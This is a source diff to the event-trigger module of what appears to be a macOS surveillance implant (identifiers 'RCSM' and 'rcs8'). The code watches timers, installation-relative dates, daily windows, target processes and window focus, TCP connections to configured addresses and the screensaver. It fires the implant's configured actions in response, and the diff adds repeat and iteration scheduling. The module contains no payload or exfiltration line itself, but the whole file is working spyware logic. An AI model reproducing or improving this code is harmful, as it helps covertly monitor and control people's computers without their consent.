@@ -38,6 +38,7 @@
 
 #import "RCSMEvents.h"
 #import "RCSMTaskManager.h"
+#import "RCSMDiskQuota.h"
 
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
@@ -47,6 +48,7 @@
 // MAXCOMLEN	16		/* max command name remembered */ 
 #define SCREENSAVER_PROCESS @"ScreenSaverEngin"
 
+extern NSString *RCSMaxLogQuotaReached;
 
 static RCSMEvents *sharedEvents = nil;
 static NSMutableArray *connectionsDetected = nil;
@@ -54,6 +56,8 @@ NSLock *connectionLock;
 
 
 @implementation RCSMEvents
+
+@synthesize mEventQuotaRunning;
 
 #pragma mark -
 #pragma mark Class and init methods
@@ -121,223 +125,356 @@ NSLock *connectionLock;
   return self;
 }
 
+- (id)init
+{
+  Class myClass = [self class];
+  
+  @synchronized(myClass)
+  {
+    if (sharedEvents != nil)
+      {
+        self = [super init];
+    
+        if (self != nil)
+          {
+            mEventQuotaRunning = NO;
+            sharedEvents = self;
+          }
+      }
+  }
+  return sharedEvents;
+}
+
 #pragma mark -
 #pragma mark Events monitor routines
 #pragma mark -
 
+
+- (BOOL)isEventEnable: (NSDictionary*) configuration
+{
+  BOOL enabled = TRUE;
+  
+  @synchronized(configuration)
+  {
+    enabled = [[configuration objectForKey:@"enabled"] intValue];
+  }
+  
+  return enabled;
+}
+
+- (BOOL)waitDelaySeconds:(NSDictionary*)configuration
+{
+  BOOL breaked = FALSE;
+  int aDelay = [[configuration objectForKey:@"delay"] intValue];
+  
+  if (aDelay > 0)
+    {
+      for (int i=0; i<aDelay; i++) 
+        { 
+          if ([configuration objectForKey: @"status"] == EVENT_STOP ||
+              [configuration objectForKey: @"status"] == EVENT_STOPPED) 
+            {
+              breaked = TRUE;
+              break;
+            }
+          else
+            sleep(1);
+        }
+    }
+  
+  sleep(1);
+  
+  return breaked;
+}
+
+- (void)tryTriggerRepeat:(int)anAction 
+               withDealy:(int)aDelay 
+            andIteration:(int)iter
+                 maxDate:(NSDate*)aDate
+        andConfiguration:(NSDictionary*)configuration
+{
+  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
+  
+  if (anAction == 0xFFFFFFFF)
+    return;
+    
+  do 
+  {
+    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+    
+    NSDate *now = [NSDate date];
+    
+    if (iter > 0)
+      iter--;
+      
+    if ([self waitDelaySeconds:configuration] == FALSE &&
+        [now earlierDate: aDate] == now &&
+        [self isEventEnable: configuration] == TRUE)
+      [taskManager triggerAction: anAction];
+    else
+      break;
+      
+    [pool release];
+    
+  } while(iter == 0xFFFFFFFF || iter > 0);
+  
+  return;
+}
+
+- (BOOL)tryTriggerRepeat:(int)anAction 
+               withDealy:(int)aDelay 
+            andIteration:(int)iter
+        andConfiguration:(NSDictionary*)configuration
+{
+  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
+  
+  if (anAction == 0xFFFFFFFF)
+    return FALSE;
+    
+  do 
+    {
+      if (iter > 0)
+        iter--;
+      
+      if ([self waitDelaySeconds:configuration] == FALSE && 
+          [self isEventEnable: configuration] == TRUE)
+        [taskManager triggerAction: anAction];
+      else
+        break;
+    
+    } while(iter == 0xFFFFFFFF || iter > 0);
+
+  return TRUE;
+}
+
+// Done.!
 - (void)eventTimer: (NSDictionary *)configuration
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
-  BOOL timerDailyTriggered = NO;
-  
   RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
+  NSDate *startThreadDate = [[NSDate date] retain];
+  timerStruct *timerRawData;
+  NSTimeInterval interval = 0;
+  BOOL timerDailyTriggered = NO;
 
   [configuration retain];
   
-  timerStruct *timerRawData;
-  NSDate *startThreadDate = [[NSDate date] retain];
-  NSTimeInterval interval = 0;
+  timerRawData = (timerStruct *)[[configuration objectForKey: @"data"] bytes];
+  
+  int actionID      = [[configuration objectForKey: @"actionID"] intValue];
+  int type          = timerRawData->type;
+  uint low          = timerRawData->loDelay;
+  uint high         = timerRawData->hiDelay;
+  uint endActionID  = timerRawData->endAction;
+  
+  int repeat        = [[configuration objectForKey:@"repeat"] intValue];
+  int delay         = [[configuration objectForKey:@"delay"] intValue];
+  int iter          = [[configuration objectForKey:@"iter"] intValue];
+  int curriteration = 0;
   
   while ([configuration objectForKey: @"status"] != EVENT_STOP &&
          [configuration objectForKey: @"status"] != EVENT_STOPPED)
     {
       NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
       
-      timerRawData = (timerStruct *)[[configuration objectForKey: @"data"] bytes];
-      
-      int actionID      = [[configuration objectForKey: @"actionID"] intValue];
-      int type          = timerRawData->type;
-      uint low          = timerRawData->loDelay;
-      uint high         = timerRawData->hiDelay;
-      uint endActionID  = timerRawData->endAction;
-      
       switch (type)
         {
-        case TIMER_AFTER_STARTUP:
-          {
-            interval = [[NSDate date] timeIntervalSinceDate: startThreadDate];
-            
-            if (fabs(interval) >= low / 1000)
-              {
-#ifdef DEBUG_EVENTS
-                warnLog(@"TIMER_AFTER_STARTUP (%f) triggered", fabs(interval));
-#endif
-                
-                [taskManager triggerAction: actionID];
-                
-                [innerPool release];
-                [outerPool release];
-                
-                [NSThread exit];
-              }
-            
-            break;
-          }
-        case TIMER_LOOP:
-          {
-            interval = [[NSDate date] timeIntervalSinceDate: startThreadDate];
-
-            if (fabs(interval) >= low / 1000)
-              {
-#ifdef DEBUG_EVENTS
-                infoLog(@"TIMER_LOOP (%f) triggered", fabs(interval));
-#endif
-                
-                if (startThreadDate != nil)
-                  [startThreadDate release];
-                
-                startThreadDate = [[NSDate date] retain];
-                [taskManager triggerAction: actionID];
-              }
-            
-            break;
-          }
-        case TIMER_DATE:
-          {
-            int64_t configuredDate = 0;
-            configuredDate = ((int64_t)high << 32) | (int64_t)low;
-
-            int64_t unixDate = (configuredDate - EPOCH_DIFF) / RATE_DIFF;
-            NSDate *givenDate = [NSDate dateWithTimeIntervalSince1970: unixDate];
-            
-            if ([[NSDate date] isGreaterThan: givenDate])
-              {
-#ifdef DEBUG_EVENTS
-                warnLog(@"TIMER_DATE (%@) triggered", givenDate);
-#endif
-                [taskManager triggerAction: actionID];
-                
-                [innerPool release];
-                [outerPool release];
-                
-                [NSThread exit];
-              }
-            
-            break;
-          }
-        case TIMER_INST:
-          {
-            int64_t configuredDate = 0;
-            // 100-nanosec unit from installation date
-            configuredDate = ((int64_t)high << 32) | (int64_t)low;
-            // seconds unit from installation date
-            configuredDate = configuredDate*(0.0000001);
-    
-            NSDictionary *bundleAttrib =
-            [[NSFileManager defaultManager] attributesOfItemAtPath: [[NSBundle mainBundle] executablePath]          
-                                                             error: nil]; 
-            
-            NSDate *creationDate = [bundleAttrib objectForKey: NSFileCreationDate];
-        
-            if (creationDate == nil)
-              break;
-            
-            NSDate *givenDate = [creationDate addTimeInterval: configuredDate];
-                   
-#ifdef DEBUG_EVENTS
-            infoLog(@"TIMER_DELTA num of seconds %d, creationDate %@, givenDate %@", 
-                    configuredDate, creationDate, givenDate);
-#endif            
-            if ([[NSDate date] isGreaterThan: givenDate])
+          // never in rcs8
+          case TIMER_AFTER_STARTUP:
             {
-#ifdef DEBUG_EVENTS
-              warnLog(@"TIMER_DELTA (%@) triggered", givenDate);
-#endif
-              [taskManager triggerAction: actionID];
+              interval = [[NSDate date] timeIntervalSinceDate: startThreadDate];
               
+              if (fabs(interval) >= low / 1000)
+                {
+                  if ([self isEventEnable: configuration] == TRUE)
+                    [taskManager triggerAction: actionID];
+                  
+                  [self tryTriggerRepeat: repeat 
+                               withDealy: delay 
+                            andIteration: iter 
+                        andConfiguration: configuration];
+                                
+                  if ([self isEventEnable: configuration] == TRUE)
+                    [taskManager triggerAction: endActionID];
+                    
+                  [innerPool release];
+                  [outerPool release];
+                  
+                  [NSThread exit];
+                }
+              
+              break;
+            }
+          case TIMER_LOOP:
+            {
+              if ([self isEventEnable: configuration] == TRUE)
+                [taskManager triggerAction: actionID];
+              
+              while (iter == 0xFFFFFFFF || curriteration < iter)
+                {
+                  if ([self waitDelaySeconds:configuration] == FALSE)
+                    {
+                      if ([self isEventEnable: configuration] == TRUE)
+                        [taskManager triggerAction: repeat];
+                      curriteration++;
+                    }
+                  else
+                    {
+                      break;
+                    }
+                }
+              
+              // event stopped: exit
+              [configuration release];
+              [innerPool release];
+              [outerPool release];
+              
+              [NSThread exit];
+              break;
+            }
+          case TIMER_DATE:
+            {
+              int64_t configuredDate = 0;
+              configuredDate = ((int64_t)high << 32) | (int64_t)low;
+
+              int64_t unixDate = (configuredDate - EPOCH_DIFF) / RATE_DIFF;
+              NSDate *givenDate = [NSDate dateWithTimeIntervalSince1970: unixDate];
+              
+              if ([[NSDate date] isGreaterThan: givenDate])
+                {
+                  if ([self isEventEnable: configuration] == TRUE)
+                    [taskManager triggerAction: actionID];
+                
+                  [self tryTriggerRepeat: repeat 
+                               withDealy: delay 
+                            andIteration: iter 
+                        andConfiguration: configuration];
+                  
+                  if ([self isEventEnable: configuration] == TRUE)
+                    [taskManager triggerAction: endActionID];
+
+                  [configuration release];
+                  [innerPool release];
+                  [outerPool release];
+                  
+                  [NSThread exit];
+                }
+              
+              break;
+            }
+          case TIMER_INST:
+            {
+              int64_t configuredDate = 0;
+              // 100-nanosec unit from installation date
+              configuredDate = ((int64_t)high << 32) | (int64_t)low;
+              // seconds unit from installation date
+              configuredDate = configuredDate*(0.0000001);
+      
+              NSDictionary *bundleAttrib =
+              [[NSFileManager defaultManager] attributesOfItemAtPath: [[NSBundle mainBundle] executablePath]          
+                                                               error: nil]; 
+              
+              NSDate *creationDate = [bundleAttrib objectForKey: NSFileCreationDate];
+          
+              if (creationDate == nil)
+                break;
+              
+              NSDate *givenDate = [creationDate addTimeInterval: configuredDate];
+            
+              if ([[NSDate date] isGreaterThan: givenDate])
+              {
+                if ([self isEventEnable: configuration] == TRUE)
+                  [taskManager triggerAction: actionID];
+                
+                [self tryTriggerRepeat: repeat 
+                             withDealy: delay 
+                          andIteration: iter 
+                      andConfiguration: configuration];
+                
+                if ([self isEventEnable: configuration] == TRUE)
+                  [taskManager triggerAction: endActionID];
+                
+                [configuration release];             
+                [innerPool release];
+                [outerPool release];
+
+                [NSThread exit];
+              }
+              
+              break;
+            }
+          case TIMER_DAILY:
+            {
+              //date description format: YYYY-MM-DD HH:MM:SS ±HHMM
+              NSDate *now = [NSDate date];
+              
+              NSRange fixedRange;
+              fixedRange.location = 11;
+              fixedRange.length   = 8;
+              
+              // UTC timers
+              NSTimeZone *timeZone = [NSTimeZone timeZoneWithName:@"UTC"];
+              
+              NSDateFormatter *inFormat = [[NSDateFormatter alloc] init];
+              [inFormat setTimeZone:timeZone];
+              [inFormat setDateFormat: @"yyyy-MM-dd hh:mm:ss ZZZ"];
+              
+              // Get current date string UTC
+              NSString *currDateStr = [inFormat stringFromDate: now];
+              [inFormat release];
+              
+              NSMutableString *dayStr = [[NSMutableString alloc] initWithString: currDateStr];
+        
+              // Set current date time to midnight
+              [dayStr replaceCharactersInRange: fixedRange withString: @"00:00:00"];
+
+              NSDateFormatter *outFormat = [[NSDateFormatter alloc] init];
+              [outFormat setTimeZone:timeZone];
+              [outFormat setDateFormat: @"yyyy-MM-dd hh:mm:ss ZZZ"];
+              
+              // Current midnite
+              NSDate *dayDate = [outFormat dateFromString: dayStr];
+              [outFormat release];
+   
+              [dayStr release];
+              
+              NSDate *lowDay  = [dayDate addTimeInterval: (low/1000)];  
+              NSDate *highDay = [dayDate addTimeInterval: (high/1000)];        
+              
+              if (timerDailyTriggered == NO &&
+                  [[now laterDate: lowDay] isEqualToDate: now] &&
+                  [[now earlierDate: highDay] isEqualToDate: now])
+                {
+                  if ([self isEventEnable: configuration] == TRUE)
+                    [taskManager triggerAction: actionID];
+                  
+                  [self tryTriggerRepeat: repeat 
+                               withDealy: delay 
+                            andIteration: iter 
+                                 maxDate: highDay
+                        andConfiguration: configuration];
+                  
+                  timerDailyTriggered = YES;
+                } 
+              else if (timerDailyTriggered == YES && 
+                       ([[now laterDate: highDay] isEqualToDate: now] ||
+                        [[now earlierDate: lowDay] isEqualToDate: now]) )
+                {
+                  if ([self isEventEnable: configuration] == TRUE)
+                    [taskManager triggerAction: endActionID];
+                  timerDailyTriggered = NO;
+                }
+              
+              break;
+            }
+          default:
+            {
               [innerPool release];
               [outerPool release];
               
               [NSThread exit];
             }
-            
-            break;
-          }
-        case TIMER_DAILY:
-          {
-            //date description format: YYYY-MM-DD HH:MM:SS ±HHMM
-            NSDate *now = [NSDate date];
-            
-            NSRange fixedRange;
-            fixedRange.location = 11;
-            fixedRange.length   = 8;
-            
-            // UTC timers
-            NSTimeZone *timeZone = [NSTimeZone timeZoneWithName:@"UTC"];
-            
-            NSDateFormatter *inFormat = [[NSDateFormatter alloc] init];
-            [inFormat setTimeZone:timeZone];
-            [inFormat setDateFormat: @"yyyy-MM-dd hh:mm:ss ZZZ"];
-            
-            // Get current date string UTC
-            NSString *currDateStr = [inFormat stringFromDate: now];
-            [inFormat release];
-            NSMutableString *dayStr = [[NSMutableString alloc] initWithString: currDateStr];
-            
-#ifdef DEBUG_EVENTS
-            infoLog(@"TIMER_DAILY currDateStr %@ (now %@)", currDateStr, now);
-#endif       
-            // Set current date time to midnight
-            [dayStr replaceCharactersInRange: fixedRange withString: @"00:00:00"];
-            
-#ifdef DEBUG_EVENTS
-            infoLog(@"TIMER_DAILY dayStr %@", dayStr);
-#endif  
-            NSDateFormatter *outFormat = [[NSDateFormatter alloc] init];
-            [outFormat setTimeZone:timeZone];
-            [outFormat setDateFormat: @"yyyy-MM-dd hh:mm:ss ZZZ"];
-            
-            // Current midnite
-            NSDate *dayDate = [outFormat dateFromString: dayStr];
-            [outFormat release];
-            
-#ifdef DEBUG_EVENTS
-            infoLog(@"TIMER_DAILY dayDate %@", dayDate);
-#endif   
-            [dayStr release];
-            
-            NSDate *highDay = [dayDate addTimeInterval: (high/1000)];
-            NSDate *lowDay = [dayDate addTimeInterval: (low/1000)];
-            
-#ifdef DEBUG_EVENTS
-            infoLog(@"TIMER_DAILY min %@ max %@ curr %@ endActionID %d", 
-                    lowDay, highDay, [NSDate date], endActionID);
-#endif            
-            
-            if (timerDailyTriggered == NO &&
-                [[now laterDate: lowDay] isEqualToDate: now] &&
-                [[now earlierDate: highDay] isEqualToDate: now])
-            {
-#ifdef DEBUG_EVENTS
-              infoLog(@"TIMER_DAILY actionID triggered");
-#endif
-              [taskManager triggerAction: actionID];
-              
-              timerDailyTriggered = YES;
-              
-            } 
-            else if (timerDailyTriggered == YES && 
-                     ([[now laterDate: highDay] isEqualToDate: now]||
-                      [[now earlierDate: lowDay] isEqualToDate: now] ))
-            {
-#ifdef DEBUG_EVENTS
-              infoLog(@"TIMER_DAILY endActionID triggered");
-#endif
-              [taskManager triggerAction: endActionID];
-              
-              timerDailyTriggered = NO;
-            }
-            
-            break;
-          }
-        default:
-          {
-            [innerPool release];
-            [outerPool release];
-            
-            [NSThread exit];
-          }
         }
       
       usleep(300000);
@@ -347,13 +484,11 @@ NSLock *connectionLock;
   
   if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
     {
-#ifdef DEBUG_EVENTS
-      verboseLog(@"Object Status: %@", [configuration objectForKey: @"status"]);
-#endif
       [configuration setValue: EVENT_STOPPED
                        forKey: @"status"];
-      [configuration release];
     }
+  
+  [configuration release];
   
   if (startThreadDate != nil)
     [startThreadDate release];
@@ -361,72 +496,63 @@ NSLock *connectionLock;
   [outerPool release];
 }
 
+// Done.! rivedere lunghezza e utf16
 - (void)eventProcess: (NSDictionary *)configuration
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
   
+  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
+  NSString *process = nil;
+  int processAlreadyFound = 0;
+  processStruct *processRawData;
+
   [configuration retain];
   
-  int processAlreadyFound = 0;
-
-  processStruct *processRawData;
   processRawData = (processStruct *)[[configuration objectForKey: @"data"] bytes];
   
   int actionID      = [[configuration objectForKey: @"actionID"] intValue];
   int onTermination = processRawData->onClose;
-  int lookForTitle  = processRawData->lookForTitle;
+  int lookForTitle  = processRawData->lookForTitle;  
+  int repeat        = [[configuration objectForKey:@"repeat"] intValue];
+  int iter          = [[configuration objectForKey:@"iter"] intValue];
+  int currentIter   = iter;
   
-  unichar *_process = (unichar *)(processRawData->name + 0x3);
+  unichar *_process = (unichar *)(processRawData->name);
   size_t _pLen       = _utf16len(_process);
   
+  // Empty processName - exiting
+  if (_pLen == 0)
+    { 
+      [configuration release];
+      [outerPool release];
+      [NSThread exit];
+    }
+    
+  process = [[NSString alloc] initWithCharacters: (unichar *)_process
+                                          length: _pLen];
+    
+  NSString *process_lowercaseString = [process lowercaseString];
+
+                                                                                  
   BOOL onFocus  = NO;
   uint32_t mode = EVENT_PROCESS_NAME;
   
   if ((lookForTitle & EVENT_PROCESS_ON_FOCUS) == EVENT_PROCESS_ON_FOCUS)
-    {
-      onFocus = YES;
-    }
+    onFocus = YES;
   
-  if (lookForTitle & EVENT_PROCESS_ON_WINDOW == EVENT_PROCESS_ON_WINDOW)
-    {
-      mode = EVENT_PROCESS_WIN_TITLE;
-#ifdef DEBUG_EVENTS
-      NSString *pr = [[NSString alloc] initWithCharacters: (unichar *)_process
-                                                   length: _pLen];
-      infoLog(@"WindowTitle (%@) Focus (%@)", pr, (onFocus) ? @"YES" : @"NO");
-      [pr release];
-#endif
-    }
-#ifdef DEBUG_EVENTS
-  else
-    {
-      NSString *pr = [[NSString alloc] initWithCharacters: (unichar *)_process
-                                                   length: _pLen];
-      infoLog(@"WindowTitle (%@) Focus (%@)", pr, (onFocus) ? @"YES" : @"NO");
-      [pr release];
-    }
-#endif
+  if ((lookForTitle & EVENT_PROCESS_ON_WINDOW) == EVENT_PROCESS_ON_WINDOW)
+    mode = EVENT_PROCESS_WIN_TITLE;
   
   while ([configuration objectForKey: @"status"]    != EVENT_STOP
          && [configuration objectForKey: @"status"] != EVENT_STOPPED)
     {
       NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
-      NSString *process = nil;
-    
-      process = [[NSString alloc] initWithCharacters: (unichar *)_process
-                                              length: _pLen];
-      
-      // Empty processName - exiting
-      if (_pLen == 0)
-        [NSThread exit];
-      
       switch (mode)
         {
         case EVENT_PROCESS_NAME:
           {
             if (processAlreadyFound != 0
-                && findProcessWithName([process lowercaseString]) == YES
+                && findProcessWithName(process_lowercaseString) == YES
                 && onFocus == YES)
               {
                 //
@@ -458,25 +584,14 @@ NSLock *connectionLock;
                             NSString *procLostFocus = [entry objectForKey: (id)kCGWindowOwnerName];
                             
                             if (matchPattern([[procLostFocus lowercaseString] UTF8String],
-                                             [[process lowercaseString] UTF8String]))
+                                             [process_lowercaseString UTF8String]))
                               {
                                 processAlreadyFound = 0;
                                 
-                                if (onTermination != -1)
-                                  {
-#ifdef DEBUG_EVENTS
-                                    warnLog(@"(%@) lost focus - end action (%d)", process, onTermination);
-#endif
+                                if (onTermination != 0xFFFFFFFF &&
+                                    [self isEventEnable: configuration] == TRUE)
                                     [taskManager triggerAction: onTermination];
-                                  }
                               }
-#ifdef DEBUG_EVENTS
-                            else
-                              {
-                                verboseLog(@"process currently looking for: %@", process);
-                                verboseLog(@"process who lost focus: %@", procLostFocus);
-                              }
-#endif
                           }
                       }
                   }
@@ -484,7 +599,7 @@ NSLock *connectionLock;
                 CFRelease(windowList);
               }
             else if (processAlreadyFound != 0
-                     && findProcessWithName([process lowercaseString]) == NO
+                     && findProcessWithName(process_lowercaseString) == NO
                      && onFocus == NO)
               {
                 //
@@ -494,15 +609,11 @@ NSLock *connectionLock;
                 //
                 processAlreadyFound = 0;
                 
-                if (onTermination != -1)
-                  {
-#ifdef DEBUG_EVENTS
-                    warnLog(@"(%@) quitted - activating end action (%d)", process, onTermination);
-#endif
-                    [taskManager triggerAction: onTermination];
-                  }
+                if (onTermination != 0xFFFFFFFF &&
+                    [self isEventEnable: configuration] == TRUE)
+                  [taskManager triggerAction: onTermination];
               }
-            else if (processAlreadyFound == 0 && findProcessWithName([process lowercaseString]) == YES)
+            else if (processAlreadyFound == 0 && findProcessWithName(process_lowercaseString) == YES)
               {
                 //
                 // If we're looking for focus, we need to grab the first window
@@ -515,7 +626,7 @@ NSLock *connectionLock;
                     NSString *procWithFocus  = [windowInfo objectForKey: @"processName"];
                     
                     if (matchPattern([[procWithFocus lowercaseString] UTF8String],
-                                     [[process lowercaseString] UTF8String]))
+                                     [process_lowercaseString UTF8String]))
                       {
 #ifdef DEBUG_EVENTS
                         warnLog(@"Process (%@) got focus", process);
@@ -541,18 +652,12 @@ NSLock *connectionLock;
                 //
                 if (processAlreadyFound == 1)
                   {
-                    if (actionID != -1)
-                      {
-#ifdef DEBUG_EVENTS
-                        warnLog(@"Application (%@) Executed, action %d", process, actionID);
-#endif
-                        if ([taskManager triggerAction: actionID] == FALSE)
-                          {
-#ifdef DEBUG_EVENTS
-                            errorLog(@"Error while triggering action: %d", actionID);
-#endif
-                          }
-                      }
+                    if (actionID != 0xFFFFFFFF &&
+                        [self isEventEnable: configuration] == TRUE)
+                      [taskManager triggerAction: actionID];
+
+                    // restart triggering iter times the repeat action
+                    currentIter = 0;
                   }
               }
             break;
@@ -574,7 +679,7 @@ NSLock *connectionLock;
                 verboseLog(@"win focus: %@", procWithFocus);
 #endif
                 if (matchPattern([[procWithFocus lowercaseString] UTF8String],
-                                 [[process lowercaseString] UTF8String]))
+                                 [process_lowercaseString UTF8String]))
                   {
 #ifdef DEBUG_EVENTS
                     warnLog(@"Window (%@) got focus", process);
@@ -590,10 +695,9 @@ NSLock *connectionLock;
                 for (NSMutableDictionary *entry in (NSArray *)windowList)
                   {
                     NSString *windowName = [entry objectForKey: (id)kCGWindowName];
-                    
-                    //if (windowName != NULL && [windowName isCaseInsensitiveLike: process])
+
                     if (matchPattern([[windowName lowercaseString] UTF8String],
-                                     [[process lowercaseString] UTF8String]))
+                                     [process_lowercaseString UTF8String]))
                       {
 #ifdef DEBUG_EVENTS
                         warnLog(@"Window (%@) was found (no focus)", process);
@@ -612,18 +716,13 @@ NSLock *connectionLock;
               {
                 processAlreadyFound = 1;
                 
-                if (actionID != -1)
-                  {
-#ifdef DEBUG_EVENTS
-                    warnLog(@"Triggering action (%d)", actionID);
-#endif
-                    if ([taskManager triggerAction: actionID] == FALSE)
-                      {
-#ifdef DEBUG_EVENTS
-                        warnLog(@"Error while triggering action: %d", actionID);
-#endif
-                      }
-                  }
+                if (actionID != 0xFFFFFFFF &&
+                    [self isEventEnable: configuration] == TRUE)
+                  [taskManager triggerAction: actionID];
+                  
+                // restart triggering repeat action iter times
+                currentIter = 0;
+                                      
               }
             else if (processAlreadyFound != 0 && titleFound == YES)
               {
@@ -658,28 +757,14 @@ NSLock *connectionLock;
                                 NSString *procLostFocus = [entry objectForKey: (id)kCGWindowName];
                                 
                                 if (matchPattern([[procLostFocus lowercaseString] UTF8String],
-                                                 [[process lowercaseString] UTF8String]))
+                                                 [process_lowercaseString UTF8String]))
                                   {
                                     processAlreadyFound = 0;
-#ifdef DEBUG_EVENTS
-                                    warnLog(@"Application (%@) lost focus", process);
-#endif
-                                    if (onTermination != -1)
-                                      {
-#ifdef DEBUG_EVENTS
-                                        warnLog(@"Window Title (%@) found (onTermination), action %d",
-                                                process, onTermination);
-#endif
-                                        [taskManager triggerAction: onTermination];
-                                      }
+                                    
+                                    if (onTermination != 0xFFFFFFFF &&
+                                        [self isEventEnable: configuration] == TRUE)
+                                      [taskManager triggerAction: onTermination];
                                   }
-#ifdef DEBUG_EVENTS
-                                else
-                                  {
-                                    verboseLog(@"process currently looking for: %@", process);
-                                    verboseLog(@"process who lost focus: %@", procLostFocus);
-                                  }
-#endif
                               }
                           }
                       }
@@ -691,14 +776,9 @@ NSLock *connectionLock;
               {
                 processAlreadyFound = 0;
               
-                if (onTermination != -1)
-                  {
-#ifdef DEBUG_EVENTS
-                    warnLog(@"Window Title (%@) not found (onTermination), action %d",
-                            process, onTermination);
-#endif
+                if (onTermination != 0xFFFFFFFF &&
+                    [self isEventEnable: configuration] == TRUE)
                     [taskManager triggerAction: onTermination];
-                  }
               }
           
             break;
@@ -706,51 +786,58 @@ NSLock *connectionLock;
         default:
           break;
         }
+    
+     if (processAlreadyFound == 1)
+       {
+          if (((iter == 0xFFFFFFFF) || (currentIter < iter)) && 
+              [self waitDelaySeconds:configuration] == FALSE)
+            {
+              if ([self isEventEnable: configuration] == TRUE)
+                [taskManager triggerAction: repeat];
+              currentIter++;
+            }
+       }
       
-      usleep(300000);
-      
-      if (process != nil)
-        {
-          [process release];
-        }
+      usleep(350000);
+
       [innerPool drain];
     }
   
   if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
     {
-#ifdef DEBUG_EVENTS
-      verboseLog(@"Object Status: %@", [configuration objectForKey: @"status"]);
-#endif
       [configuration setValue: EVENT_STOPPED
                        forKey: @"status"];
-                       
-      [configuration release];
     }
+  
+  [process release];
+  [configuration release];
   
   [outerPool drain];
 }
 
+// Done.!
 - (void)eventConnection: (NSDictionary *)configuration
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+  
   RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
-  
-  [configuration retain];
-  
   char mibName[] = "net.inet.tcp.pcblist";
-  size_t len = 0;
-  char *buffer;
   connectionStruct *connectionRawData;
-
   BOOL connectionFound;
-  int actionID      = [[configuration objectForKey: @"actionID"] intValue];
-  
   struct xinpgen *xig, *oxig;
   struct tcpcb *tp = NULL;
   struct inpcb *inp;
   struct xsocket *so;
-  
-  //[connectionsDetected retain];
+  size_t len = 0;
+  char *buffer;
+
+  [configuration retain];
+
+  int actionID      = [[configuration objectForKey: @"actionID"] intValue];
+  int repeat        = [[configuration objectForKey:@"repeat"] intValue];
+  int delay         = [[configuration objectForKey:@"delay"] intValue];
+  int iter          = [[configuration objectForKey:@"iter"] intValue];
+  int end           = [[configuration objectForKey:@"end"] intValue];
   
   while ([configuration objectForKey: @"status"]    != EVENT_STOP
          && [configuration objectForKey: @"status"] != EVENT_STOPPED)
@@ -763,10 +850,7 @@ NSLock *connectionLock;
       u_long ipAddress   = connectionRawData->ipAddress;
       u_long netMask     = connectionRawData->netMask;
       int connectionPort = connectionRawData->port;
-      
-      //ipAddress = inet_addr("0.0.0.0");
-      //netMask = inet_addr("0.0.0.0");
-      
+ 
       struct in_addr tempAddress;
       tempAddress.s_addr = ipAddress;
 
@@ -785,7 +869,9 @@ NSLock *connectionLock;
 #endif
                   
                   free(buffer);
-                  
+                  [configuration release];
+                  [innerPool release];
+                  [outerPool release];
                   [NSThread exit];
                 }
             }
@@ -794,8 +880,10 @@ NSLock *connectionLock;
 #ifdef DEBUG_EVENTS
               errorLog(@"Error on malloc");
 #endif
-              
               free(buffer);
+              [configuration release];
+              [innerPool release];
+              [outerPool release];
               [NSThread exit];
             }
         }
@@ -806,6 +894,9 @@ NSLock *connectionLock;
 #endif
           
           free(buffer);
+          [configuration release];
+          [innerPool release];
+          [outerPool release];
           [NSThread exit];
         }
       
@@ -817,9 +908,6 @@ NSLock *connectionLock;
       NSString *ip        = [NSString stringWithUTF8String: inet_ntoa(tempAddress)];
       NSNumber *port      = [NSNumber numberWithInt: connectionPort];
       NSString *ipNetmask = [NSString stringWithUTF8String: inet_ntoa(netMaskStruct)];
-      //NSString *ip        = [[NSString alloc] initWithUTF8String: inet_ntoa(tempAddress)];
-      //NSNumber *port      = [[NSNumber alloc] initWithInt: connectionPort];
-      //NSString *ipNetmask = [[NSString alloc] initWithUTF8String: inet_ntoa(netMaskStruct)];
       
       //
       // Cycle through all the TCP connections
@@ -887,7 +975,17 @@ NSLock *connectionLock;
 #ifdef DEBUG_EVENTS
                           warnLog(@"Event Connection triggered!");
 #endif
-                          [taskManager triggerAction: actionID];
+                          if ([self isEventEnable: configuration] == TRUE)
+                            [taskManager triggerAction: actionID];
+                          
+                          [self tryTriggerRepeat: repeat 
+                                       withDealy: delay 
+                                    andIteration: iter 
+                                andConfiguration: configuration];
+                          
+                          if ([self isEventEnable: configuration] == TRUE)
+                            [taskManager triggerAction: end];
+                          
                         }
                     }
                 }
@@ -923,69 +1021,78 @@ NSLock *connectionLock;
           [connection release];
         }
       
-      //[ip release];
-      //[port release];
-      //[ipNetmask release];
-      
       [innerPool release];
       usleep(500000);
     }
   
   if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
     {
-#ifdef DEBUG_EVENTS
-      verboseLog(@"Object Status: %@", [configuration objectForKey: @"status"]);
-#endif
       [configuration setValue: EVENT_STOPPED forKey: @"status"];
       
       [connectionsDetected removeAllObjects];
-      [configuration release];
     }
+    
+  [configuration release];
   
   [outerPool release];
 }
 
+// Done.!
 - (void)eventScreensaver: (NSDictionary *)configuration
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
   
+  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];  
+  BOOL screenSaverFound = FALSE;
+  int onTermination;
+    
   [configuration retain];
   
-  BOOL screenSaverFound = FALSE;
+  [[configuration objectForKey: @"data"] getBytes: &onTermination];
+  int actionID      = [[configuration objectForKey: @"actionID"] intValue];
+  int repeat        = [[configuration objectForKey:@"repeat"] intValue];
+  int iter          = [[configuration objectForKey:@"iter"] intValue];
+  int currentIter   = iter;
+  
+  NSString *process = [NSString stringWithString: SCREENSAVER_PROCESS];
+  NSString *process_lowercaseString = [process lowercaseString];
   
